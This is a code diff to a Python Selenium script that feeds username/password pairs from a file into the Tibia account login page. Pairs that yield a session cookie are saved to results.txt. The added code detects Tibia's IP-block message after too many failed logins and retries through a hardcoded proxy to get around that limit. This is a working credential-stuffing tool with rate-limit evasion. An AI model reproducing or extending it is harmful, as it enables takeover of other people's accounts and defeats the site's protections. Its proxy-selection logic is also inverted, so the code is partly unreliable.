@@ -16,7 +16,10 @@ def saveCredntialResultToFile(credential,fileName):
 #getProxyFrom proxylist
 def getProxy(idProxy):
     proxy=["91.203.5.175:443"]
-    return proxy[idProxy]
+    lenght = len(proxy)
+    if lenght < idProxy:
+        return proxy[idProxy]
+    return proxy[0]
 
 
 def getCredentialsFromFile():
@@ -33,15 +36,49 @@ def getCredentialsFromFile():
     f.close()
     return credentials
 
-#set manually 
-childsOfBodyForBlankPageBoundary = 4
+#default proxy
+PROXY = "91.203.5.175:443"
+chrome_options = webdriver.ChromeOptions()
+chrome_options.add_argument('--proxy-server=%s' % PROXY)
 
-proxyId = -1
 isProxy = False
-chrome_options = None
 browser = None
 
 credentials = getCredentialsFromFile()
+
+def goWithProxy(credential,proxyId):
+    proxy = getProxy(proxyId)
+    browser = webdriver.Chrome(options=chrome_options)
+    usernameStr = credential.username
+    passwordStr = credential.password
+    browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
+
+    username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
+    username.send_keys(usernameStr)
+    password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
+    password.send_keys(passwordStr)
+
+    signInButton = browser.find_element_by_class_name('ButtonText')
+    signInButton.click()
+
+    try:        
+        errorMessage = browser.find_element_by_class_name('ErrorMessage')
+        errorText = errorMessage.text
+        print(errorText)
+        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
+        if ipBlockText in errorText:
+            print("Block ip error")
+            browser.quit()
+            goWithProxy(credential,proxyId+1)
+    except:
+        print('Error Message not found')
+
+    cookie = browser.get_cookie('SecureSessionID')
+
+    #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
+
+    if cookie != None:
+        saveCredntialResultToFile(credential,"results.txt") 
 
 for credential in credentials:
     if(isProxy):
@@ -66,11 +103,21 @@ for credential in credentials:
     current_url = browser.current_url
     
     signInButton.click()
+    try:        
+        errorMessage = browser.find_element_by_class_name('ErrorMessage')
+        errorText = errorMessage.text
+        print(errorText)
+        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
+        if ipBlockText in errorText:
+            print("Block ip error")
+            browser.quit()
+            goWithProxy(credential,0)
+    except:
+        print('Error Message not found')
 
     cookie = browser.get_cookie('SecureSessionID')
 
-    browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
+    #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
 
     if cookie != None:
-        saveCredntialResultToFile(credential,"results.txt")
-    browser.quit()    
+        saveCredntialResultToFile(credential,"results.txt") 
